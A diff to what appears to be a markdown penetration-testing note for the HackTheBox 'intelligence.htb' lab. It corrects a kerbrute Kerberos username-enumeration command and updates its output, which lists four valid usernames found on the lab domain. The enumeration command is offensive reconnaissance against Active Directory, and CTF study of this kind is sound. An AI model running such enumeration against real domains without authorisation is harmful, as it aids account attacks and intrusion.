@@ -75,18 +75,24 @@ Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop
 If we don't have anything, we try to find valid kerberos usernames with a usernames wordlist.
 
 ```shell-session
-attacker@kali$ kerbrute userenum --dc intelligence.htb -d intelligene.htb users.txt
+attacker@kali$ kerbrute userenum usernames.txt --dc intelligence.htb -d intelligence.htb
 
-   __             __               __     
+    __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
  / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
 /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
 
-Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop
+Version: dev (n/a) - 02/08/24 - Ronnie Flathers @ropnop
 
-2022/02/17 22:57:12 >  Using KDC(s):
-2022/02/17 22:57:12 >  	172.16.5.5:88
+2024/02/08 15:31:14 >  Using KDC(s):
+2024/02/08 15:31:14 >   intelligence.htb:88
+
+2024/02/08 15:31:14 >  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb
+2024/02/08 15:31:14 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
+2024/02/08 15:31:14 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb
+2024/02/08 15:31:14 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
+
 ```
 
 ## CrackMapExec
